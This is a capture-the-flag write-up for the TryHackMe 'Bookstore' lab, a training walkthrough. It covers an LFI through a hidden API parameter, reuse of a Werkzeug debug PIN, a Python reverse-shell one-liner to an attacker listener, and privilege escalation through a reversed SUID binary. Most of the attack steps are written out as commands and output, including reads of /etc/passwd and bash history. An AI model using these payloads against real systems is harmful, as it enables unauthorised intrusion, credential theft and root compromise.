# Bookstore  TryHackMe Writeup

**Target:** `TARGET_IP` (10.129.140.255 at time of solve)
**OS:** Linux (Ubuntu 18.04)
**Difficulty:** Medium
**Tech stack:** Apache 2.4.29, Werkzeug 0.14.1 (Flask debug), Python 3.6.9
**Exploit chain:** API-version pivot ? hidden parameter LFI ? `~/.bash_history` ? Werkzeug debug PIN ? `/console` RCE ? SUID magic-number reversing ? root

---

## Attack Chain Overview

```
nmap ? 22, 80, 5000 (Werkzeug)
    ?
feroxbuster :5000 ? /api/, /console (PIN-locked)
    ?
HTML hint: "the debugger pin is inside sid's bash history file" ? need LFI
    ?
Discover legacy /api/v1/  (ffuf  v2 hardened, v1 still wired up)
    ?
ffuf hidden-parameter brute ? ?show=  ? arbitrary file read
    ?
?show=/home/sid/.bash_history ? WERKZEUG_DEBUG_PIN=123-321-135
    ?
/console + PIN ? Python RCE ? reverse shell as sid ? user.txt
    ?
SUID /home/sid/try-harder ? strings empty ? ltrace empty ? objdump
    ?
(input ^ 0x1116) ^ 0x5db3 == 0x5dcd21f4 ? input = 1573454177
    ?
./try-harder ? /bin/bash -p ? root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Hidden Parameter Discovery](#3-hidden-parameter-discovery)
4. [LFI ? Werkzeug Debug PIN](#4-lfi--werkzeug-debug-pin)
5. [RCE via Werkzeug `/console`](#5-rce-via-werkzeug-console)
6. [Post-Exploitation (`sid`)](#6-post-exploitation-sid)
7. [Privilege Escalation  SUID Reversing](#7-privilege-escalation--suid-reversing)
8. [Root Flag](#8-root-flag)
9. [Key Takeaways](#9-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,80,5000,23636,36497 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.6p1 |
| 80/tcp | Apache 2.4.29 |
| 5000/tcp | **Werkzeug 0.14.1 (Python 3.6.9)**  Flask in debug mode |

The Werkzeug banner is the entire attack surface. See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Web Enumeration

```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
feroxbuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,env,sql,js
feroxbuster -u http://$TARGET:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
```

Two anchor endpoints on port 5000:
- `/api/`  books endpoint (data, no auth).
- `/console`  Werkzeug debugger, PIN-locked.

Login page comment leaks the pivot:
```
also the debugger pin is inside sid's bash history file
```

So the chain is **LFI ? read `~sid/.bash_history` ? grab the PIN ? `/console`**. Tools: [feroxbuster](../../tools/fuzz/feroxbuster.md), [whatweb](../../tools/recon/whatweb.md).

---

## 3. Hidden Parameter Discovery

Full technique: [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md).

The current `/api/v2/` route refuses everything we throw at it. Try the legacy route:

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s "http://$TARGET:5000/api/v1/resources/books?id=1"
# returns data ? v1 is still alive
```

Brute the parameter name on v1, with the payload pointing at the file we want:

```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
ffuf -u "http://$TARGET:5000/api/v1/resources/books?FUZZ=/home/sid/.bash_history" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 2 -mc all -fw 11
# show     [Status: 200, Size: 116, Words: 5, Lines: 8]
```

`?show=` is a hidden, undocumented parameter that pipes its value into a file read. See [ffuf.md](../../tools/fuzz/ffuf.md).

---

## 4. LFI ? Werkzeug Debug PIN

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s "http://$TARGET:5000/api/v1/resources/books?show=/etc/passwd"     # confirm
curl -s "http://$TARGET:5000/api/v1/resources/books?show=/home/sid/.bash_history"
# ...
# export WERKZEUG_DEBUG_PIN=123-321-135
```

Standard Werkzeug PIN-via-LFI pattern  see [werkzeug-debug-rce.md](../../exploits/web-rce/werkzeug-debug-rce.md) for the full discussion (other paths to try, sister CVEs, hardened versions).

---

## 5. RCE via Werkzeug `/console`

Browse to `http://$TARGET:5000/console`, paste `123-321-135`. Python prompt.

```bash
# What it does: opens or uses a TCP connection/listener.
# Why here: receive shell, transfer data or check connectivity.
nc -lvnp 4444
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])
```

Stabilise:
```bash
# What it does: executes or compiles the script/program with the specified arguments.
# Why here: launch the necessary exploit or helper in this phase.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Now running as **sid**.

---

## 6. Post-Exploitation (`sid`)

Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md). User flag in `/home/sid/user.txt`.

The two leads that mattered:
```bash
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -perm -4000 -type f 2>/dev/null
# /home/sid/try-harder        ? custom SUID, owned by root
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /home/sid/try-harder
# -rwsrwsr-x 1 root sid 8.3K Oct 20  2020 try-harder
# What it does: identifies file type and metadata.
# Why here: choose the correct parser or technique.
file /home/sid/try-harder
# ELF 64-bit LSB executable, x86-64
```

A user-home, root-owned, custom-named SUID is always worth reversing.

---

## 7. Privilege Escalation  SUID Reversing

Full technique: [suid-binary-reversing.md](../../exploits/privesc-linux/suid-binary-reversing.md).

The 3-stage funnel:

```bash
# What it does: filters text with the specified pattern.
# Why here: extract the important clue from a large output.
strings ./try-harder | grep -iE "magic|number|secret|/bin/"
# nothing useful  number stored in hex, not ASCII

# What it does: inspecciona comportamiento o desensamblado de un binario.
# Why here: entender el binario usado para escalar privilegios.
ltrace ./try-harder
# scanf, puts  no strcmp/memcmp ? comparison is inline ? objdump
```

```bash
# What it does: inspecciona comportamiento o desensamblado de un binario.
# Why here: entender el binario usado para escalar privilegios.
objdump -d ./try-harder | awk '/^.*<main>:/,/^$/'
```

Key block:
```asm
movl  $0x5db3, -0x10(%rbp)       ; mystery = 0x5db3
call  __isoc99_scanf@plt          ; scanf("%d", &input)
xor   $0x1116, %eax               ; eax ^= 0x1116
xor   %eax, -0xc(%rbp)            ; mystery ^= eax
cmpl  $0x5dcd21f4, -0xc(%rbp)     ; if (mystery == 0x5dcd21f4)
```

XOR is its own inverse, so:

```bash
# What it does: executes or compiles the script/program with the specified arguments.
# Why here: launch the necessary exploit or helper in this phase.
python3 -c 'print(0x5dcd21f4 ^ 0x5db3 ^ 0x1116)'
# 1573454177
```

```bash
./try-harder
# What's The Magic Number?!
1573454177
# id
# uid=0(root) gid=0(root) groups=0(root)
```

Tools: [strings](../../tools/reversing/strings.md), [ltrace](../../tools/reversing/ltrace.md), [objdump](../../tools/reversing/objdump.md).

---

## 8. Root Flag

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /root/root.txt
```

---

## 9. Key Takeaways

- Werkzeug 0.14 + Flask debug is **always** PIN-via-LFI exploitable. The whole derivation is reproducible from host facts you can read with the same primitive  but `~/.bash_history` is faster.
- Always retry the hardened endpoint against `/api/v1/`, `/api/v0/`, `/legacy/`. Devs harden the current version and forget the old route is still wired up.
- Hidden parameters are discovered by *making the response size diverge*. The payload value matters as much as the wordlist  point it at a real file when fuzzing for LFI parameters.
- Custom root-owned SUID in a user's home: always reverse it. `strings` first (cheap), then `ltrace` (libcalls only), then `objdump` (sees inline arithmetic).
- XOR-based magic-number checks are trivial: XOR is self-inverting, so `(input ^ A) ^ B == C` solves to `input = A ^ B ^ C` directly.

---

## Related Notes
- [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md)  the LFI discovery
- [werkzeug-debug-rce.md](../../exploits/web-rce/werkzeug-debug-rce.md)  initial RCE
- [suid-binary-reversing.md](../../exploits/privesc-linux/suid-binary-reversing.md)  root privesc
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)  post-foothold checklist
- [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [ffuf](../../tools/fuzz/ffuf.md), [curl](../../tools/web/curl.md), [netcat](../../tools/pivot/netcat.md)  recon & exploitation
- [strings](../../tools/reversing/strings.md), [ltrace](../../tools/reversing/ltrace.md), [objdump](../../tools/reversing/objdump.md)  SUID reversing


